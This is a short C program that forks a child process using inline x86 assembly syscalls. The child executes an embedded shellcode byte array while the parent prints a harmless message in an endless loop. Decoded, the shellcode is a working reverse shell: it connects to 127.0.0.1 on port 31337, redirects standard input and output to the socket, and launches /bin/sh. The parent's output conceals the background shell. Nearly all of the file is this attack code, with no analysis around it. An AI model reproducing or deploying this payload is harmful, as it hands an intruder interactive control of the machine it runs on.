#include <stdio.h>


void forkedFunction(){
    unsigned char buf[] = 
        "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
        "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
        "\x02\x00\x7a\x69\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
        "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
        "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
    void * shellcode = buf;
    
    typedef unsigned (*function)(void);
    function func = (function)shellcode;
    unsigned out = func();
}

int main(){
    asm(
        //save our registers for parent process
        "push %eax\n\t"
        "push %ebx\n\t"
        "push %ecx\n\t"
        
        //take parents "getpid()" process ID and store in ebx
        "xor %eax, %eax\n\t"
        "movl $20, %eax\n\t"
        "int $0x80\n\t"

        "movl %eax, %ebx\n\t"

        //spawn our child process
        "xor %eax, %eax\n\t"
        "movl $2, %eax\n\t"
        "int $0x80\n\t"
        
        "movl %eax, %ecx\n\t"
        
        //Get our current process ID again and compare it to the parent's
        "xor %eax, %eax\n\t" 
        "movl $20, %eax\n\t"
        "int $0x80\n\t"
        
        "cmp %ebx, %eax\n\t"
        "jz 2f\n\t"

        //Handle child process
        "call forkedFunction\n\t"

        //Handle Parent process
        "2:\n\t"
        "pop %ecx\n\t"
        "pop %ebx\n\t"
        "pop %eax\n\t");
    
    char buffer[]="I am the parent process\n";
    
    while(1){
        write(1, buffer, sizeof(buffer));
        sleep(2);
    }


}
